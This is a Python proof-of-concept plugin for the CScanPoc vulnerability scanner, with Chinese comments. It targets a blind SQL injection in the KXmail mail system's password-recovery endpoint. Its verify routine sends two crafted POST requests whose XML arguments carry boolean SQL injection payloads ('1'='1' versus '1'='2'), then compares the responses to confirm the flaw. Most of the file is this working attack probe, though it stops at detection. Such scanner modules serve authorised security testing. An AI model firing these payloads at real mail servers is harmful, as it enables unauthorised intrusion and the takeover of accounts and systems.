# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'KXmail_0002'  # 平台漏洞编号，留空
    name = '科信邮件系统 SQL盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-06-25'  # 漏洞公布时间
    desc = '''
        科信邮件系统 /prog/get_passwd.server.php 可添加数据包进行盲注，导致系统沦陷。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=065810'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KXmail'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a0aecb6d-f5ef-4fd9-97b1-55588e09fdc7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref: http://www.wooyun.org/bugs/wooyun-2010-065810
            hh = hackhttp.hackhttp()
            url = self.target + '/prog/get_passwd.server.php'
            postdata1 = "xjxfun=DoOperate&xjxr=1403400674828&xjxargs[]=<xjxobj><e><k>setup</k><v>S1</v></e><e><k>user</k><v>S<![CDATA[postmaster@111' or '1'='1]]></v></e></xjxobj>"
            postdata2 = "xjxfun=DoOperate&xjxr=1403400674828&xjxargs[]=<xjxobj><e><k>setup</k><v>S1</v></e><e><k>user</k><v>S<![CDATA[postmaster@111' or '1'='2]]></v></e></xjxobj>"
            code, head, res1, errcode, _ = hh.http(url, post=postdata1)
            code, head, res2, errcode, _ = hh.http(url, post=postdata2)

            if code == 200 and '/prog/get_passwd_1.php' in res1 and '/prog/get_passwd_1.php' not in res2:
                # security_warning(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
